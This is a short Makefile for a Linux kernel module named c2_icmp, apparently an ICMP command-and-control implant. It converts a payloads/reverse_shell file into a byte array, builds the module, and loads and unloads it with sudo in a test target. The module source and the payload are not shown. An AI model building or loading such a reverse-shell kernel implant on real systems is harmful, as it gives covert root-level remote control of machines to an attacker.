# .ko files are the object file + kernel generated data structures
# kernel build system automatically C file with these data structures
# compiled to object file and both obj files linked forming .ko file
# dynamic linker in kernel expects these data structures in .ko files

obj-m = c2_icmp.o
KERNEL_VERSION = $(shell uname -r)
BYTE_ARR = $(shell xxd -i payloads/reverse_shell)
all:
	make -C /lib/modules/$(KERNEL_VERSION)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(KERNEL_VERSION)/build/ M=$(PWD) clean

test:
	sudo dmesg -C
	sudo insmod c2_icmp.ko
	sudo rmmod c2_icmp.ko
	dmesg
